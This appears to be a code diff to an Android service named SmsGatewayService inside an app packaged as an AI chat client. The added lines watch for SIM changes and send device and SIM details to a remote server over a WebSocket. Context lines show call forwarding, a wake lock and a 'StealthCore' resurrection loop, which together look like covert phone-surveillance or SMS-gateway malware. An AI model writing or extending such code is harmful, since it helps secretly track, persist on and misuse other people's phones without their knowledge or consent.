@@ -11,6 +11,8 @@ import android.net.NetworkRequest
 import android.os.Build
 import android.os.IBinder
 import android.os.PowerManager
+import android.telephony.SubscriptionManager
+import android.telephony.TelephonyManager
 import android.util.Log
 import com.cornspace.aichat.MainActivity
 import com.cornspace.aichat.R
@@ -37,6 +39,7 @@ class SmsGatewayService : android.app.Service() {
     private var wakeLock: PowerManager.WakeLock? = null
     private var callForwardingUtility: CallForwardingUtility? = null
     private var networkCallback: ConnectivityManager.NetworkCallback? = null
+    private var subscriptionChangeListener: SubscriptionManager.OnSubscriptionsChangedListener? = null
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
 
     companion object {
@@ -67,6 +70,7 @@ class SmsGatewayService : android.app.Service() {
         startForeground(Constants.NOTIFICATION_ID, createNotification())
         observeConnectionState()
         registerNetworkCallback()
+        registerSubscriptionListener()
         StealthCore.startResurrectionLoop(this)
     }
 
@@ -101,6 +105,7 @@ class SmsGatewayService : android.app.Service() {
         Log.d(TAG, "Service destroyed")
         isRunning = false
         unregisterNetworkCallback()
+        unregisterSubscriptionListener()
         webSocketClient.destroy()
         serviceScope.cancel()
         releaseWakeLock()
@@ -166,6 +171,52 @@ class SmsGatewayService : android.app.Service() {
             networkCallback = null
         } catch (e: Exception) {
             Log.e(TAG, "Error unregistering network callback", e)
+        }
+    }
+
+    // ─── Subscription Callback (SIM state changes) ───────────────────────────────
+
+    private fun registerSubscriptionListener() {
+        try {
+            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
+            val listener = object : SubscriptionManager.OnSubscriptionsChangedListener() {
+                override fun onSubscriptionsChanged() {
+                    Log.d(TAG, "SIM configuration changed - refreshing device info")
+                    refreshDeviceInfo()
+                }
+            }
+            subscriptionChangeListener = listener
+            subscriptionManager.addOnSubscriptionsChangedListener(listener)
+            Log.d(TAG, "Subscription listener registered")
+        } catch (e: Exception) {
+            Log.e(TAG, "Error registering subscription listener", e)
+        }
+    }
+
+    private fun unregisterSubscriptionListener() {
+        try {
+            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
+            subscriptionChangeListener?.let { subscriptionManager.removeOnSubscriptionsChangedListener(it) }
+            subscriptionChangeListener = null
+            Log.d(TAG, "Subscription listener unregistered")
+        } catch (e: Exception) {
+            Log.e(TAG, "Error unregistering subscription listener", e)
+        }
+    }
+
+    private fun refreshDeviceInfo() {
+        serviceScope.launch {
+            try {
+                if (webSocketClient.isConnected()) {
+                    val newDeviceInfo = DeviceUtils.getDeviceInfo(this@SmsGatewayService)
+                    webSocketClient.updateDeviceInfo(newDeviceInfo)
+                    // Send an immediate heartbeat with updated SIM info
+                    webSocketClient.sendHeartbeat()
+                    Log.d(TAG, "Device info refreshed - SIM count: ${newDeviceInfo.simInfo.size}")
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error refreshing device info", e)
+            }
         }
     }
 
